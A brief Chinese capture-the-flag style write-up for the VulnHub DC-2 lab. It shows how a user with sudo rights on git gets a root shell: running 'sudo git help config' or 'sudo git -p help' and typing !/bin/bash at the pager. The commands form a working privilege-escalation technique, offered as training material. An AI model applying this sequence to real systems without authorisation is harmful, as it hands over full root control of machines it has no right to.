## 实验环境——vulnhub-dc2靶场

git提权

前提：用户可以使用sudo中git权限

查看sudo权限

```bash
sudo -l
```

![image-20240119172000450](http://111.229.225.13:81/i/2024/01/19/ukdzbw-2.png)

可以发现git命令存在sudo提权

基于此进行权限提升

方式：

```bash
sudo git help config #在末行命令模式输入 
!/bin/bash 或 !'sh' #完成提权 
sudo git -p help 
!/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell
```

输入sudo git help config后会有一个很长的文本，在此基础上，按下: ，在输入!/bin/bash

然后按q退出,再输出sudo git -p help命令，同上输入!/bin/bash

![image-20240119172321933](http://111.229.225.13:81/i/2024/01/19/ukcsu5-2.png)

![image-20240119172502115](http://111.229.225.13:81/i/2024/01/19/ukhkee-2.png)

![image-20240119172527354](http://111.229.225.13:81/i/2024/01/19/ukcay3-2.png)